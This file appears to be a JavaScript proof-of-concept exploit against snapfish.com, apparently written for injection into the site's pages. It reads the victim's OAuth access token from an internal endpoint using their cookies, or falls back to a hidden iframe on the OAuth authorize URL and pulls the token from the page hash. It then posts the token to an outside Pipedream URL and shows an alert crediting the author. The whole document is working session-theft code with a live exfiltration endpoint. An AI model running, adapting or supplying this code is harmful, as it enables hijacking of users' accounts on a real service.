(async () => {
    const PIPEDREAM = 'https://eoeyl49g7f6zxem.m.pipedream.net';
    const AUTH_URL = 'https://www.snapfish.com/oauth2/auth?client_id=fa42c54e820f482bb3b74d2217aacbfd&redirect_uri=https://www.snapfish.com/chat/us/site&state=ChatBot';

    const exfil = (source, token) => {
        fetch(PIPEDREAM, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ source, token })
        }).catch(() => {});
        alert(`Session exfiltrated to @m4rc10sz as a PoC Purposes: \n\n Your Token:\n\n ${token}`);
    };

    // Fallback
    const viaAuthRedirect = () => {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.onload = () => {
            try {
                const hash = iframe.contentWindow.location.hash;
                const token = decodeURIComponent(hash.split('access_token=')[1]?.split('&')[0] || '');
                exfil('oauth2/auth#access_token', token);
            } catch (e) {
                alert('Error extracting token: ' + e);
            } finally {
                iframe.remove();
            }
        };
        document.body.appendChild(iframe);
        iframe.src = AUTH_URL;
    };

    try {
        const res = await fetch('https://www.snapfish.com/library/getOauthInfo', { credentials: 'include' });
        const data = await res.json();

        if (data.unauthorized) return viaAuthRedirect();

        exfil('getOauthInfo.oa2', data.oauthInfo.oa2);
    } catch (e) {
        alert('Error: ' + e);
    }
})();
